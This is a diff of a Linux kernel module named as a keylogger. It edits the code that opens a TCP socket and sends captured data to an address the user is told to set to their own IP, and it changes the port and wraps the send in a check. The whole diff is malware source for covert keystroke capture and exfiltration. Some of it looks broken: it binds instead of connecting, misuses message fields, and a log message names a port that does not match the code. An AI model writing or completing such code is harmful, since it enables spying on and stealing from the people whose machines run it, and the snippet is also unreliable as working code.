@@ -59,41 +59,43 @@ static int __init keylogger_init(void) {
                 err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
                 if (err < 0) {
                         printk(KERN_INFO "failed tcp thingo\n");
-                        printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
+                        printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
                         break;
                 }
                 struct sockaddr_in addr = {
                     .sin_family = AF_INET,
-                    .sin_port = htons (6000),
+                    .sin_port = htons (61100),
                     .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
                 };
                 err = sock->ops->bind (sock, (struct sockaddr *) &addr, sizeof(addr));
                 if (err < 0) {
-                        printk(KERN_INFO "failed binding to port 6000\n");
-                        printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
+                        printk(KERN_INFO "failed binding to port 6110\n");
+                        printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
                         break;
                 }
             }
+            if (i != 0) {
+                struct msghdr msg;
+                msg.msg_name = kmalloc(40, GFP_KERNEL);
+                snprintf(msg.msg_name, 40, "your data: i = %d\n", i);
+                msg.msg_namelen = sizeof(msg.msg_name);
+                msg.msg_flags = MSG_TRYHARD;
 
-            struct msghdr msg;
-            msg.msg_name = kmalloc(40, GFP_KERNEL);
-            snprintf(msg.msg_name, 40, "your data: i = %d\n", i);
-            msg.msg_namelen = sizeof(msg.msg_name);
-            msg.msg_flags = MSG_TRYHARD;
+                struct kvec vec;
+                vec.iov_base = pack;
+                vec.iov_len = sizeof(pack);
 
-            struct kvec vec;
-            vec.iov_base = pack;
-            vec.iov_len = sizeof(pack);
-
-            err = kernel_sendmsg(sock, &msg, &vec, (size_t) 1, (size_t) sizeof(pack));
-            if (err < 0) {
-                    printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
-                    break;
+                err = kernel_sendmsg(sock, &msg, &vec, (size_t) 1, (size_t) sizeof(pack));
+                if (err < 0) {
+                        printk(KERN_INFO "failed to send! I don't know what is the point of me, so kill me plz\n");
+                        break;
+                }
+                kfree(msg.msg_name);
             }
-            kfree(msg.msg_name);
         }
         i++;
     }
+    sock_release(sock);
     set_fs(old_fs);
     return 0;
 }
